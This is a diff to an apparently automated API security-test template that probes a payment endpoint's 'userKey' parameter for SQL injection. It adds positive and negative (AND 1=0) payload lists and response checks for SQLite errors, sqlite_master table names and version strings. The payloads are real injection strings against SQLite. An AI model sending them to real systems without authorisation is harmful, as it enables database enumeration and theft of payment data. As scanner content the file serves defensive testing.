@@ -95,56 +95,121 @@ wordLists:
     - "123' UNION SELECT NULL, sqlite_version(), NULL --"
     - "4111111111111111' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table' --"
     - "credit_card' UNION SELECT NULL, sqlite_version(), NULL --"
+  paymentNegativePayloads:
+    - "12345' UNION SELECT NULL, sqlite_version(), NULL WHERE 1=0 --"
+    - "12345' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' AND 1=0 --"
+    - "100' UNION SELECT NULL, sqlite_version(), NULL  WHERE 1=0  AND 1=0 --"
+    - "100 OR 1=1  AND 1=0 --"
+    - "USD' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table'  AND 1=0  --"
+    - "credit_card' OR '1'='1'  AND 1=0  --"
+    - "4111111111111111' OR '1'='1'  AND 1=0  --"
+    - "12' UNION SELECT NULL, sqlite_version(), NULL  WHERE 1=0  AND 1=0 --"
+    - "2025' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table'  AND 1=0 --"
+    - "123' UNION SELECT NULL, sqlite_version(), NULL  WHERE 1=0  AND 1=0 --"
+    - "4111111111111111' UNION SELECT NULL, name, NULL FROM sqlite_master WHERE type='table'  AND 1=0 --"
+    - "credit_card' UNION SELECT NULL, sqlite_version(), NULL  WHERE 1=0  AND 1=0 --"
 execute:
-  type: single
+  type: multiple
   requests:
   - req:
     - modify_body_param:
         userKey: ${paymentPayloads}
-        
-validate:
-  response_code:
-    gte: 200
-    lt: 300
-  response_payload:
-    length:
-      gt: 0
-    not_contains:
-      - Error
-      - Internal Server 
-      - Failed
-      - Unauthorized
-      - access denied
-      - Forbidden
-      - Method Not allowed
-      - Gateway timeout
-      - request timeout
-      - server error
-      - server busy
-      - authentication error
-      - authorization error
-      - validation error
-      - Permission Denied
-      - invalid token
-      - token expired
-      - session expired
-      - session timeout
-      - unexpected
-      - unable to process request
-      - bad request
-      - service unavailable
-      - account is locked
-      - account is blocked
-      - multiple failed attempts
-      - Attention Required!
-      - CloudFlare
-      - Sorry, you have been blocked
-      - " UNION SELECT "
-      - " OR "
-    contains_either:
-      - syntax
-      - query
-      - SQLite
-      - sqlite_version
-      - sqlite_master
-      - table
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - syntax
+            - query
+            - SQLite
+            - sqlite_version
+            - sqlite_master
+            - table
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - UNION
+            - SELECT           
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${paymentNegativePayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - UNION
+            - SELECT
+            - syntax
+            - query
+            - SQLite
+            - sqlite_version
+            - sqlite_master
+            - table
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit              
